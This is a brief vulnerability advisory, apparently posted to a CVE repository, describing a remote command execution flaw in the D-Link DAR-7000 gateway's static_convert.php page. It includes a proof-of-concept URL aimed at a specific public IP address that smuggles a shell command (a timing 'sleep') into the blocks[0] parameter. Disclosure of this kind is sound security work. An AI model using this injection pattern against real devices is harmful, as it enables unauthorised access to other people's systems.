The D-LINK DAR-7000 series online behavior audit gateway has a RCE vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000

Vulnerability Path ：/view/IPV6/naborTable/static_convert.php

poc:
https://61.183.231.22:9090/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20 `sleep${IFS}3`
<img width="616" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/068fb43f-577e-4f75-936b-a4756a506b77">
